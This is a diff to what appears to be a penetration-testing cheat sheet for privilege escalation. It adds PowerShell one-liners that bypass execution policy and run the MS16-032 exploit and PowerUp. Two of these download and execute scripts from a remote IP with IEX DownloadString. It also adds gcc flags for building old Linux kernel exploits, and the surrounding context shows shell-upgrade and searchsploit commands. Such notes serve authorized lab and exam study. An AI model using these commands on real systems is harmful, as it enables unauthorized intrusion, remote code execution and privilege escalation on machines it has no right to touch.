@@ -19,10 +19,14 @@ https://github.com/doffensive/wired-courtyard
 Running Local Commands
 ```powershell
 powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+
+powershell -ExecutionPolicy ByPass -command "& { . Z:\PowerUp.ps1; Invoke-AllChecks }"
 ```
 Running commands from a remote host
 ```powershell
 powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.139/PowerUp.ps1'); Invoke-AllChecks"
+
+powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.139/Invoke-MS16-032.ps1'); Invoke-MS16-032"
 ```
 
 ## File Transfer
@@ -111,6 +115,7 @@ Upgrade shells
 python -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=linux
 ```
+https://netsec.ws/?p=337
 
 Check all files for ones that may be interesting (like authorized_keys)
 
@@ -137,6 +142,12 @@ Always use google site:exploit-db.com <kernel_ver> to search for vulnerabilities
 searchsploit "Linux Kernel"  
 searchsploit linux 2.6 | grep -i ubuntu | grep local 
 ```
+
+Compiling binaries on Kali for old distros
+```
+gcc 3.c -o 3 -static -Wl,--hash-style=sysv -m32
+```
+Only need static if there is a CRuntime Libc2.7 error
 
 ## Pre-Compiles Exploits
 https://github.com/SecWiki/linux-kernel-exploits
